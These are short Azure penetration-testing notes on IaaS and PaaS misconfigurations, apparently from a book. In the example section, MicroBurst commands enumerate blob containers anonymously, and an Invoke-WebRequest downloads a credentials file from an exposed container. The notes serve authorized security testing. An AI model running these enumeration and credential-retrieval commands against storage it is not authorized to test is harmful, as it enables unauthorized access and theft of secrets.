# Configuration-related vulnerabilities

## Categories:

### 1) IaaS configuration-related vulnerabilities

 - Azure IaaS services can be generalized as services that take the place of traditional
infrastructure. The most common resources are virtual machines, virtual machine scale
sets and Windows Virtual Desktops (WVDs). These services can be deployed privately
within a virtual network, connected to on-premises networks, or exposed to the internet
using a public IP address, as mentioned earlier in this chapter.

 - Using the list of public IP addresses that a client has provided to us from the results of the
commands in the Azure public IP address ranges section of this chapter, we can scan those
IP addresses with common vulnerability scanning tools. Remember to always check the IP
that you have been provided with for ownership and authorization.

 - For virtual machines and WVDs, we will typically be looking for weak or default
credentials for available management ports. It should also be noted that any IaaS hosts
that have internet-facing services could also have additional service misconfigurations.
These vulnerabilities are not limited to the parameters that are managed in Azure.
An administrator could misconfigure a service on a VM, expose it to the internet, and
create a vulnerability.

### 2) PaaS configutation-related vulnerabilities

## Example:

#### Misconfigured blob containers:

    Import-Module MicroBurst.psm1

    Invoke-EnumerateAzureBlobs -Base BASE_NAME (Anonymously enumerate storage account containers)

    Invoke-WebRequest -Uri "https://azurepentesting.blob.core.windows.net/private/credentials.txt" -OutFile "credentials.txt" (Extract enumerated container found with MicroBurst)

## To use custom permutation wordlist we use the command:

    Invoke-EnumerateAzureBlobs -Base BASE_NAME -Folders .\CUSTOM_CONTAINER_WORDLIST.TXT
